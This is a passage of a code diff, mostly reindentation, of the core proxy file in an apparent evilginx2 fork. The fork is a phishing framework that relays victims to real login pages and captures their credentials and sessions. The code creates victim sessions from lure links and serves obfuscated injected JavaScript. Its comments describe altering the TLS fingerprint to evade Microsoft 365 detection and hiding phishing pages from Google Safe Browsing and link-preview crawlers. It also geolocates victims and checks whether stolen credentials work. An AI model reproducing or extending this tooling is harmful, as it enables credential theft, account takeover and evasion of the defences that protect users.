@@ -11,54 +11,54 @@ Telegram Edition enhancements:
 package core
 
 import (
-    "bufio"
-    "bytes"
-    "crypto/rand"
-    "crypto/rc4"
-    "crypto/sha256"
-    "crypto/tls"
-    "encoding/base64"
-    "encoding/json"
-    "fmt"
-    "html"
-    "io"
-    "net"
-    "net/http"
-    "net/url"
-    "os"
-    "path/filepath"
-    "regexp"
-    "sort"
-    "strconv"
-    "strings"
-    "sync"
-    "time"
+	"bufio"
+	"bytes"
+	"crypto/rand"
+	"crypto/rc4"
+	"crypto/sha256"
+	"crypto/tls"
+	"encoding/base64"
+	"encoding/json"
+	"fmt"
+	"html"
+	"io"
+	"net"
+	"net/http"
+	"net/url"
+	"os"
+	"path/filepath"
+	"regexp"
+	"sort"
+	"strconv"
+	"strings"
+	"sync"
+	"time"
 
-    "golang.org/x/net/proxy"
+	"golang.org/x/net/proxy"
 
-    "github.com/elazarl/goproxy"
-    "github.com/fatih/color"
-    "github.com/go-acme/lego/v3/challenge/tlsalpn01"
-    "github.com/inconshreveable/go-vhost"
-    http_dialer "github.com/mwitkow/go-http-dialer"
+	"github.com/elazarl/goproxy"
+	"github.com/fatih/color"
+	"github.com/go-acme/lego/v3/challenge/tlsalpn01"
+	"github.com/inconshreveable/go-vhost"
+	http_dialer "github.com/mwitkow/go-http-dialer"
 
-    "github.com/kgretzky/evilginx2/database"
-    "github.com/kgretzky/evilginx2/log"
+	"github.com/kgretzky/evilginx2/database"
+	"github.com/kgretzky/evilginx2/log"
 )
 
 const (
-    CONVERT_TO_ORIGINAL_URLS = 0
-    CONVERT_TO_PHISHING_URLS = 1
+	CONVERT_TO_ORIGINAL_URLS = 0
+	CONVERT_TO_PHISHING_URLS = 1
 )
 
 const (
-    // Timeouts are deliberately tight: this daemon runs on small VPSes (1 vCPU)
-    // that get hit by scanner floods of half-open TLS connections. A shorter read
-    // deadline recycles stalled handshakes before they pile up and exhaust fds/RAM.
-    httpReadTimeout   = 25 * time.Second
-    httpWriteTimeout  = 25 * time.Second
-    httpIdleTimeout   = 40 * time.Second
-    httpHeaderTimeout = 15 * time.Second
+	// Timeouts are deliberately tight: this daemon runs on small VPSes (1 vCPU)
+	// that get hit by scanner floods of half-open TLS connections. A shorter read
+	// deadline recycles stalled handshakes before they pile up and exhaust fds/RAM.
+	httpReadTimeout   = 25 * time.Second
+	httpWriteTimeout  = 25 * time.Second
+	httpIdleTimeout   = 40 * time.Second
+	httpHeaderTimeout = 15 * time.Second
 )
 
 // original borrowed from Modlishka project (https://github.com/drk1wi/Modlishka)
@@ -66,1653 +66,1661 @@ var MATCH_URL_REGEXP = regexp.MustCompile(`\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\
 var MATCH_URL_REGEXP_WITHOUT_SCHEME = regexp.MustCompile(`\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw|asp|social|bank|finance|money|invest|capital|credit|insurance|app|store)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
 
 type HttpProxy struct {
-    Server            *http.Server
-    Proxy             *goproxy.ProxyHttpServer
-    crt_db            *CertDb
-    cfg               *Config
-    db                *database.Database
-    bl                *Blacklist
-    gophish           *GoPhish
-    sniListener       net.Listener
-    isRunning         bool
-    sessions          map[string]*Session
-    sids              map[string]int
-    cookieName        string
-    last_sid          int
-    developer         bool
-    livefeed          bool
-    turnstile         bool
-    ip_whitelist      map[string]int64
-    ip_sids           map[string]string
-    auto_filter_mimes []string
-    ip_mtx            sync.Mutex
-    session_mtx       sync.Mutex
+	Server            *http.Server
+	Proxy             *goproxy.ProxyHttpServer
+	crt_db            *CertDb
+	cfg               *Config
+	db                *database.Database
+	bl                *Blacklist
+	gophish           *GoPhish
+	sniListener       net.Listener
+	isRunning         bool
+	sessions          map[string]*Session
+	sids              map[string]int
+	cookieName        string
+	last_sid          int
+	developer         bool
+	livefeed          bool
+	turnstile         bool
+	ip_whitelist      map[string]int64
+	ip_sids           map[string]string
+	auto_filter_mimes []string
+	ip_mtx            sync.Mutex
+	session_mtx       sync.Mutex
 
-    // --- Telegram Edition Additions by @officialmonsterz ---
-    geoIP             *GeoIPDatabase       // GeoIP geolocation engine (Win #1)
-    randomizer        *Randomizer          // Per-page-load CSS randomizer (Win #2)
-    validator         *CredentialValidator // Login credential validator (Win #3)
+	// --- Telegram Edition Additions by @officialmonsterz ---
+	geoIP      *GeoIPDatabase       // GeoIP geolocation engine (Win #1)
+	randomizer *Randomizer          // Per-page-load CSS randomizer (Win #2)
+	validator  *CredentialValidator // Login credential validator (Win #3)
 
-    dashboardHandler http.Handler // optional: dashboard virtual host handler
-    redirectsDir     string       // directory containing redirect page HTML files
+	dashboardHandler http.Handler // optional: dashboard virtual host handler
+	redirectsDir     string       // directory containing redirect page HTML files
 }
 
 type ProxySession struct {
-    SessionId    string
-    Created      bool
-    PhishDomain  string
-    PhishletName string
-    Index        int
-    LureHostname string // custom lure subdomain (full hostname), if different from phishlet landing host
-    LureRedirect bool   // true when this response is the initial lure redirect (not proxied upstream content)
+	SessionId    string
+	Created      bool
+	PhishDomain  string
+	PhishletName string
+	Index        int
+	LureHostname string // custom lure subdomain (full hostname), if different from phishlet landing host
+	LureRedirect bool   // true when this response is the initial lure redirect (not proxied upstream content)
 }
 
 // set the value of the specified key in the JSON body
 func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error) {
-    var data map[string]interface{}
-    if err := json.Unmarshal(body, &data); err != nil {
-        return nil, err
-    }
-    data[key] = value
-    newBody, err := json.Marshal(data)
-    if err != nil {
-        return nil, err
-    }
-    return newBody, nil
+	var data map[string]interface{}
+	if err := json.Unmarshal(body, &data); err != nil {
+		return nil, err
+	}
+	data[key] = value
+	newBody, err := json.Marshal(data)
+	if err != nil {
+		return nil, err
+	}
+	return newBody, nil
 }
 
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool, livefeed bool, turnstile bool) (*HttpProxy, error) {
-    p := &HttpProxy{
-        Proxy:             goproxy.NewProxyHttpServer(),
-        Server:            nil,
-        crt_db:            crt_db,
-        cfg:               cfg,
-        db:                db,
-        bl:                bl,
-        gophish:           NewGoPhish(),
-        isRunning:         false,
-        last_sid:          0,
-        developer:         developer,
-        livefeed:          livefeed,
-        turnstile:         turnstile,
-        ip_whitelist:      make(map[string]int64),
-        ip_sids:           make(map[string]string),
-        auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript", "application/ion+json", "text/plain", "image/svg+xml", "text/css", "application/xml", "text/xml"},
-    }
-
-    p.Server = &http.Server{
-        Addr:              fmt.Sprintf("%s:%d", hostname, port),
-        Handler:           p.Proxy,
-        ReadTimeout:       httpReadTimeout,
-        WriteTimeout:      httpWriteTimeout,
-        ReadHeaderTimeout: httpHeaderTimeout,
-        IdleTimeout:       httpIdleTimeout,
-    }
-
-    if cfg.proxyConfig.Enabled {
-        err := p.setProxy(cfg.proxyConfig.Enabled, cfg.proxyConfig.Type, cfg.proxyConfig.Address, cfg.proxyConfig.Port, cfg.proxyConfig.Username, cfg.proxyConfig.Password)
-        if err != nil {
-            log.Error("proxy: %v", err)
-            cfg.EnableProxy(false)
-        } else {
-            log.Info("enabled proxy: " + cfg.proxyConfig.Address + ":" + strconv.Itoa(cfg.proxyConfig.Port))
-        }
-    }
-
-    p.cookieName = strings.ToLower(GenRandomString(8))
-    p.sessions = make(map[string]*Session)
-    p.sids = make(map[string]int)
-
-    p.Proxy.Verbose = false
-
-    // Harden the outbound TLS fingerprint towards origin sites (e.g. login.microsoftonline.com).
-    // Microsoft 365 AITM detections match the default Go crypto/tls ClientHello (JA3).
-    // Selecting a Chrome-like cipher and curve set changes that fingerprint so the
-    // proxy-origin connection no longer matches a stock Go client.
-    p.Proxy.Tr.TLSClientConfig = &tls.Config{
-        InsecureSkipVerify: true,
-        MinVersion:         tls.VersionTLS12,
-        CipherSuites: []uint16{
-            tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
-            tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
-            tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
-            tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
-            tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
-            tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
-            tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA,
-            tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
-            tls.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA,
-            tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
-        },
-        CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
-    }
-
-    p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
-        req.URL.Scheme = "https"
-        req.URL.Host = req.Host
-
-        // Dashboard virtual host — serve when Host matches configured dashboard subdomain
-        if p.dashboardHandler != nil {
-            if dashHost := p.cfg.GetDashboardHost(); dashHost != "" && req.Host == dashHost {
-                p.dashboardHandler.ServeHTTP(w, req)
-                return
-            }
-        }
-
-        // Redirect page virtual hosts — serve when Host matches a configured redirect page
-        if p.redirectsDir != "" {
-            if rp := p.cfg.GetRedirectPageByHost(req.Host); rp != nil {
-                ServeRedirectPage(w, req, rp, p.redirectsDir, p.cfg.GetTurnstileSiteKey())
-                return
-            }
-        }
-
-        p.Proxy.ServeHTTP(w, req)
-    })
-
-    p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)
-
-    // --- Initialize Telegram Edition Components by @officialmonsterz ---
-    // GeoIP — looks up visitor country/city/VPN status from IP address
-    p.geoIP = cfg.GetGeoIP()
-    // Randomizer — applies random CSS transforms to every HTML page load
-    p.randomizer = NewRandomizer()
-    // Validator — tests if captured credentials actually work on the real service
-    p.validator = NewCredentialValidator()
-
-    p.Proxy.OnRequest().
-        DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
-            ps := &ProxySession{
-                SessionId:    "",
-                Created:      false,
-                PhishDomain:  "",
-                PhishletName: "",
-                Index:        -1,
-            }
-            ctx.UserData = ps
-            hiblue := color.New(color.FgHiBlue)
-
-            // handle ip blacklist
-            from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]
-
-            // handle proxy headers
-            proxyHeaders := []string{"X-Forwarded-For", "X-Real-IP", "X-Client-IP", "Connecting-IP", "True-Client-IP", "Client-IP", "X-Proxy-Id", "CF-Connecting-IP"}
-            for _, h := range proxyHeaders {
-                origin_ip := req.Header.Get(h)
-                if origin_ip != "" {
-                    from_ip = strings.SplitN(origin_ip, ":", 2)[0]
-                    break
-                }
-            }
-
-            // Redirect known crawlers, safe-browsing probes, link previewers and other
-            // automated agents to the real site before any other handling (including the
-            // IP blacklist), so Google Safe Browsing and social-media previewers never
-            // see phishing content and classify the host as an innocent redirector.
-            // Detection is by User-Agent AND by source IP range, so a browser-mimicking
-            // crawl from Google infrastructure is still sent to the genuine site.
-            // Auto-blacklist the IP when enabled so later non-redirect paths stay cheap.
-            if isScannerUA(req.UserAgent()) || isScannerIP(from_ip) {
-                mode := p.cfg.GetBlacklistMode()
-                if (mode == "unauth" || mode == "all") && !p.bl.IsWhitelisted(from_ip) {
-                    if err := p.bl.AddIP(from_ip); err == nil && p.bl.IsVerbose() {
-                        log.Warning("blacklist: scanner UA, blacklisted ip: %s (%s)", from_ip, req.UserAgent())
-                    }
-                } else if p.bl.IsVerbose() {
-                    log.Warning("blacklist: scanner UA redirected: %s (%s)", from_ip, req.UserAgent())
-                }
-                return p.scannerRedirect(req)
-            }
-
-            if p.cfg.GetBlacklistMode() != "off" {
-                if p.bl.IsBlacklisted(from_ip) {
-                    // A blacklisted IP must still be able to enter the phish flow when it
-                    // clicks a lure link, or while it still holds a live session. Without
-                    // this a returning visitor is stuck on the decoy page and the shared
-                    // lure URL stops working for them.
-                    if !p.ipHasActiveSession(from_ip) {
-                        if _, _, lerr := p.cfg.FindLureByPath(req.Host, req.URL.Path); lerr != nil {
-                            if p.bl.IsVerbose() {
-                                log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
-                            }
-                            return p.blockRequest(req)
-                        }
-                    }
-                    if p.bl.IsVerbose() {
-                        log.Debug("blacklist: ip '%s' allowed through (lure entry/session)", from_ip)
-                    }
-                }
-                if p.cfg.GetBlacklistMode() == "all" {
-                    if !p.bl.IsWhitelisted(from_ip) {
-                        err := p.bl.AddIP(from_ip)
-                        if p.bl.IsVerbose() {
-                            if err != nil {
-                                log.Error("blacklist: %s", err)
-                            } else {
-                                log.Warning("blacklisted ip address: %s", from_ip)
-                            }
-                        }
-                    }
-
-                    return p.blockRequest(req)
-                }
-            }
-
-            req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
-            o_host := req.Host
-            lure_url := req_url
-            req_path := req.URL.Path
-            if req.URL.RawQuery != "" {
-                req_url += "?" + req.URL.RawQuery
-            }
-
-            pl := p.getPhishletByPhishHost(req.Host)
-            remote_addr := from_ip
-
-            redir_re := regexp.MustCompile(`^/s/([^\\/]*)`)
-            js_inject_re := regexp.MustCompile(`^/s/([^\\/]*)/([^\\/]*)`)
-
-            if js_inject_re.MatchString(req.URL.Path) {
-                ra := js_inject_re.FindStringSubmatch(req.URL.Path)
-                if len(ra) >= 3 {
-                    session_id := ra[1]
-                    js_id := ra[2]
-                    if strings.HasSuffix(js_id, ".js") {
-                        js_id = js_id[:len(js_id)-3]
-                        if s, ok := p.sessions[session_id]; ok {
-                            var d_body string
-                            var js_params *map[string]string = nil
-                            js_params = &s.Params
-
-                            script, err := pl.GetScriptInjectById(js_id, js_params)
-                            if err == nil {
-                                d_body += obfuscateJS(script) + "\n\n"
-                            } else {
-                                log.Warning("js_inject: script not found: '%s'", js_id)
-                            }
-                            resp := goproxy.NewResponse(req, "application/javascript", 200, string(d_body))
-                            return req, resp
-                        } else {
-                            log.Warning("js_inject: session not found: '%s'", session_id)
-                        }
-                    }
-                }
-            } else if redir_re.MatchString(req.URL.Path) {
-                ra := redir_re.FindStringSubmatch(req.URL.Path)
-                if len(ra) >= 2 {
-                    session_id := ra[1]
-                    if strings.HasSuffix(session_id, ".js") {
-                        session_id = session_id[:len(session_id)-3]
-                        if s, ok := p.sessions[session_id]; ok {
-                            var d_body string
-                            if !s.IsDone {
-                                if s.RedirectURL != "" {
-                                    dynamic_redirect_js := DYNAMIC_REDIRECT_JS
-                                    dynamic_redirect_js = strings.ReplaceAll(dynamic_redirect_js, "{session_id}", s.Id)
-                                    d_body += obfuscateJS(dynamic_redirect_js) + "\n\n"
-                                }
-                            }
-                            resp := goproxy.NewResponse(req, "application/javascript", 200, string(d_body))
-                            return req, resp
-                        } else {
-                            log.Warning("js: session not found: '%s'", session_id)
-                        }
-                    } else {
-                        if _, ok := p.sessions[session_id]; ok {
-                            redirect_url, ok := p.waitForRedirectUrl(session_id)
-                            if ok {
-                                type ResponseRedirectUrl struct {
-                                    RedirectUrl string `json:"redirect_url"`
-                                }
-                                d_json, err := json.Marshal(&ResponseRedirectUrl{RedirectUrl: redirect_url})
-                                if err == nil {
-                                    s_index, _ := p.sids[session_id]
-                                    log.Important("[%d] dynamic redirect to URL: %s", s_index, redirect_url)
-                                    resp := goproxy.NewResponse(req, "application/json", 200, string(d_json))
-                                    return req, resp
-                                }
-                            }
-                            resp := goproxy.NewResponse(req, "application/json", 408, "")
-                            return req, resp
-                        } else {
-                            log.Warning("api: session not found: '%s'", session_id)
-                        }
-                    }
-                }
-            }
-
-            phishDomain, phished := p.getPhishDomain(req.Host)
-            if phished {
-                // Lure-first resolution: if the request path matches a known lure,
-                // the lure's phishlet takes precedence over the hostname-based
-                // resolution. This prevents mis-routing when multiple phishlets
-                // share the same phish subdomain (Go map iteration is random).
-                if _, lurePl, lerr := p.cfg.FindLureByPath(o_host, req_path); lerr == nil {
-                    if pl == nil || pl.Name != lurePl.Name {
-                        pl = lurePl
-                        if d, dok := p.cfg.GetSiteDomain(lurePl.Name); dok {
-                            phishDomain = d
-                        }
-                    }
-                }
-
-                pl_name := ""
-                if pl != nil {
-                    pl_name = pl.Name
-                    ps.PhishletName = pl_name
-                }
-                session_cookie := getSessionCookieName(pl_name, p.cookieName)
-
-                ps.PhishDomain = phishDomain
-                req_ok := false
-                if p.handleSession(req.Host) && pl != nil {
-                    l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
-                    if err == nil {
-                        log.Debug("triggered lure for path '%s'", req_path)
-                    }
-
-                    var create_session bool = true
-                    var ok bool = false
-                    sc, err := req.Cookie(session_cookie)
-                    // Cross-phishlet cookie recovery: if the expected cookie wasn't found,
-                    // scan other enabled phishlets. This handles the case where two phishlets
-                    // share a phish subdomain and getPhishletByPhishHost picked the wrong one.
-                    if err != nil {
-                        for altSite := range p.cfg.phishlets {
-                            if altSite == pl_name || !p.cfg.IsSiteEnabled(altSite) {
-                                continue
-                            }
-                            altCk := getSessionCookieName(altSite, p.cookieName)
-                            if altSc, altErr := req.Cookie(altCk); altErr == nil {
-                                if _, hasSid := p.sids[altSc.Value]; hasSid {
-                                    if altPl, plErr := p.cfg.GetPhishlet(altSite); plErr == nil {
-                                        pl = altPl
-                                        pl_name = altSite
-                                        ps.PhishletName = pl_name
-                                        session_cookie = altCk
-                                        sc = altSc
-                                        err = nil
-                                    }
-                                    break
-                                }
-                            }
-                        }
-                    }
-                    if err == nil {
-                        ps.Index, ok = p.sids[sc.Value]
-                        if ok {
-                            // If a lure URL triggered this request and the existing session is
-                            // already done (credentials captured), force a fresh session so the
-                            // victim goes through the login flow again.
-                            if l != nil {
-                                if s, exists := p.sessions[sc.Value]; exists && s.IsDone {
-                                    ok = false
-                                    create_session = true
-                                }
-                            }
-                            if ok {
-                                create_session = false
-                                ps.SessionId = sc.Value
-                                p.whitelistIP(remote_addr, ps.SessionId, pl.Name)
-                                // Restore lure hostname for sessions that used a custom subdomain
-                                if s, ok2 := p.sessions[ps.SessionId]; ok2 && s.PhishLure != nil {
-                                    if s.PhishLure.Hostname != "" && pl != nil && s.PhishLure.Hostname != pl.GetLandingPhishHost() {
-                                        ps.LureHostname = s.PhishLure.Hostname
-                                    }
-                                }
-                            }
-                        } else {
-                            log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
-                        }
-                    } else {
-                        if l == nil && p.isWhitelistedIP(remote_addr, pl.Name) {
-                            create_session = false
-                            req_ok = true
-                            // Recover the session id for this IP too, so a whitelisted
-                            // client whose session cookie is not (yet) present is still
-                            // proxied through the original session.
-                            if wlSid, wlPl := p.findWhitelistedSession(remote_addr); wlPl != nil {
-                                pl = wlPl
-                                pl_name = wlPl.Name
-                                ps.PhishletName = pl_name
-                                ps.SessionId = wlSid
-                                if idx, ok2 := p.sids[wlSid]; ok2 {
-                                    ps.Index = idx
-                                }
-                            }
-                        } else if l == nil {
-                            // Whitelist fallback: check all phishlets for this IP.
-                            // Recovers in-progress sessions when the wrong phishlet was
-                            // resolved from a shared subdomain (cookie not yet set in browser).
-                            if wlSid, wlPl := p.findWhitelistedSession(remote_addr); wlPl != nil {
-                                pl = wlPl
-                                pl_name = wlPl.Name
-                                ps.PhishletName = pl_name
-                                ps.SessionId = wlSid
-                                if idx, ok2 := p.sids[wlSid]; ok2 {
-                                    ps.Index = idx
-                                }
-                                create_session = false
-                                req_ok = true
-                            }
-                        }
-                    }
-
-                    if create_session {
-                        if !p.cfg.IsSiteHidden(pl_name) {
-                            if l != nil {
-                                if l.PausedUntil > 0 && time.Unix(l.PausedUntil, 0).After(time.Now()) {
-                                    log.Warning("[%s] lure is paused: %s [%s]", hiblue.Sprint(pl_name), req_url, remote_addr)
-                                    return p.blockRequest(req)
-                                }
-
-                                if len(l.UserAgentFilter) > 0 {
-                                    re, err := regexp.Compile(l.UserAgentFilter)
-                                    if err == nil {
-                                        if !re.MatchString(req.UserAgent()) {
-                                            log.Warning("[%s] unauthorized request (user-agent rejected): %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
-
-                                            if p.cfg.GetBlacklistMode() == "unauth" {
-                                                if !p.bl.IsWhitelisted(from_ip) {
-                                                    err := p.bl.AddIP(from_ip)
-                                                    if p.bl.IsVerbose() {
-                                                        if err != nil {
-                                                            log.Error("blacklist: %s", err)
-                                                        } else {
-                                                            log.Warning("blacklisted ip address: %s", from_ip)
-                                                        }
-                                                    }
-                                                }
-                                            }
-                                            return p.blockRequest(req)
-                                        }
-                                    } else {
-                                        log.Error("lures: user-agent filter regexp is invalid: %v", err)
-                                    }
-                                }
-
-                                session, err := NewSession(pl.Name)
-
-                                if err == nil {
-                                    p.extractParams(session, req.URL)
-
-                                    // ========================================================
-                                    // FIX: sid is now defined BEFORE the GeoIP block
-                                    // that references it. This eliminates the compile error:
-                                    // "undefined: sid"
-                                    // ========================================================
-                                    sid := p.last_sid
-                                    p.last_sid += 1
-
-                                    // === GeoIP Lookup (Telegram Edition by @officialmonsterz) ===
-                                    if p.geoIP != nil {
-                                        geo := p.geoIP.Lookup(remote_addr)
-                                        if geo.CountryISOCode != "" {
-                                            session.SetCustom("geo_country_code", geo.CountryISOCode)
-                                            session.SetCustom("geo_country_name", geo.CountryName)
-                                            session.SetCustom("geo_city_name", geo.CityName)
-                                            session.SetCustom("geo_latitude", fmt.Sprintf("%.4f", geo.Latitude))
-                                            session.SetCustom("geo_longitude", fmt.Sprintf("%.4f", geo.Longitude))
-                                            session.SetCustom("geo_isp", geo.ISP)
-                                            session.SetCustom("geo_asn", fmt.Sprintf("%d", geo.ASN))
-                                            if geo.IsVPN {
-                                                session.SetCustom("geo_vpn", "true")
-                                            }
-                                            if geo.IsProxy {
-                                                session.SetCustom("geo_proxy", "true")
-                                            }
-                                            if geo.IsDatacenter {
-                                                session.SetCustom("geo_datacenter", "true")
-                                            }
-                                            log.Info("[%d] [%s] geo: %s, %s (%.4f, %.4f) VPN:%v DC:%v",
-                                                sid, hiblue.Sprint(pl_name),
-                                                geo.CountryName, geo.CityName,
-                                                geo.Latitude, geo.Longitude,
-                                                geo.IsVPN, geo.IsDatacenter)
-
-                                            // Store geo data in the database for the dashboard
-                                            geoJSON, _ := json.Marshal(geo)
-                                            p.db.SetSessionCustom(session.Id, "geoip", string(geoJSON))
-
-                                            if p.cfg.GetBlockVPN() && (geo.IsVPN || geo.IsProxy || geo.IsDatacenter) {
-                                                log.Warning("[%d] [%s] blocked VPN/proxy/datacenter: %s (VPN:%v Proxy:%v DC:%v)", sid, hiblue.Sprint(pl_name), remote_addr, geo.IsVPN, geo.IsProxy, geo.IsDatacenter)
-                                                return p.blockRequest(req)
-                                            }
-                                        }
-                                    }
-
-                                    if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
-                                        if trackParam, ok := session.Params["o"]; ok {
-                                            if trackParam == "track" {
-                                                rid, ok := session.Params["rid"]
-                                                if ok && rid != "" {
-                                                    log.Info("[gophish] [%s] email opened: %s (%s)", hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
-                                                    p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
-                                                    err = p.gophish.ReportEmailOpened(rid, remote_addr, req.Header.Get("User-Agent"))
-                                                    if err != nil {
-                                                        log.Error("gophish: %s", err)
-                                                    }
-                                                    database.HandleEmailOpened(rid, map[string]string{"email": rid}, p.livefeed)
-                                                    return p.trackerImage(req)
-                                                }
-                                            }
-                                        }
-                                    }
-
-                                    log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
-                                    log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
-                                    p.sessions[session.Id] = session
-                                    p.sids[session.Id] = sid
-
-                                    if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
-                                        rid, ok := session.Params["rid"]
-                                        if ok && rid != "" {
-                                            p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
-                                            err = p.gophish.ReportEmailLinkClicked(rid, remote_addr, req.Header.Get("User-Agent"))
-                                            if err != nil {
-                                                log.Error("gophish: %s", err)
-                                            }
-                                            database.HandleClickedLink(rid, map[string]string{"email": rid}, p.livefeed)
-                                        }
-                                    }
-
-                                    landing_url := req_url
-                                    if err := p.db.CreateSession(session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr); err != nil {
-                                        log.Error("database: %v", err)
-                                    }
-
-                                    session.RemoteAddr = remote_addr
-                                    session.UserAgent = req.Header.Get("User-Agent")
-                                    session.Cmsgid = "req.Header.Get()"
-                                    session.RedirectURL = pl.RedirectUrl
-                                    if l.RedirectUrl != "" {
-                                        session.RedirectURL = l.RedirectUrl
-                                    }
-                                    if session.RedirectURL != "" {
-                                        session.RedirectURL, _ = p.replaceUrlWithPhished(session.RedirectURL)
-                                    }
-                                    session.PhishLure = l
-                                    log.Debug("redirect URL (lure): %s", session.RedirectURL)
-
-                                    ps.SessionId = session.Id
-                                    ps.Created = true
-                                    ps.Index = sid
-                                    p.whitelistIP(remote_addr, ps.SessionId, pl.Name)
-
-                                    if p.turnstile {
-                                        if rid, ok := session.Params["rid"]; ok && rid != "" {
-                                            return p.redirectTurnstile(req, rid)
-                                        }
-                                    }
-
-                                    req_ok = true
-                                }
-                            } else {
-                                // Autolure gateway: root request on an autolure hostname
-                                // redirects the visitor to the current active rotating path.
-                                // Scanner UAs are already blocked above so only real browsers reach here.
-                                if req_path == "/" || req_path == "" {
-                                    if al, _ := p.cfg.GetAutoLureByHostname(req.Host); al != nil {
-                                        activeURL := "https://" + req.Host + al.Path
-                                        log.Info("[autolure] [%s] gateway → %s [%s]", hiblue.Sprint(pl_name), activeURL, remote_addr)
-                                        return p.javascriptRedirect(req, activeURL)
-                                    }
-                                }
-                                log.Warning("[%s] unauthorized request: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
-
-                                if p.cfg.GetBlacklistMode() == "unauth" {
-                                    if !p.bl.IsWhitelisted(from_ip) {
-                                        err := p.bl.AddIP(from_ip)
-                                        if p.bl.IsVerbose() {
-                                            if err != nil {
-                                                log.Error("blacklist: %s", err)
-                                            } else {
-                                                log.Warning("blacklisted ip address: %s", from_ip)
-                                            }
-                                        }
-                                    }
-                                }
-                                return p.blockRequest(req)
-                            }
-                        } else {
-                            log.Warning("[%s] request to hidden phishlet: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
-                        }
-                    }
-                }
-
-                if ps.SessionId == "" && p.handleSession(req.Host) {
-                    if !req_ok {
-                        return p.blockRequest(req)
-                    }
-                }
-
-                if ps.SessionId != "" {
-                    if s, ok := p.sessions[ps.SessionId]; ok {
-                        l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
-                        if err == nil {
-                            if l.Redirector != "" {
-                                if !p.isForwarderUrl(req.URL) {
-                                    if s.RedirectorName == "" {
-                                        s.RedirectorName = l.Redirector
-                                        s.LureDirPath = req_path
-                                    }
-
-                                    t_dir := l.Redirector
-                                    if !filepath.IsAbs(t_dir) {
-                                        redirectors_dir := p.cfg.GetRedirectorsDir()
-                                        t_dir = filepath.Join(redirectors_dir, t_dir)
-                                    }
-
-                                    index_path1 := filepath.Join(t_dir, "index.html")
-                                    index_path2 := filepath.Join(t_dir, "index.htm")
-                                    index_found := ""
-                                    if _, err := os.Stat(index_path1); !os.IsNotExist(err) {
-                                        index_found = index_path1
-                                    } else if _, err := os.Stat(index_path2); !os.IsNotExist(err) {
-                                        index_found = index_path2
-                                    }
-
-                                    if _, err := os.Stat(index_found); !os.IsNotExist(err) {
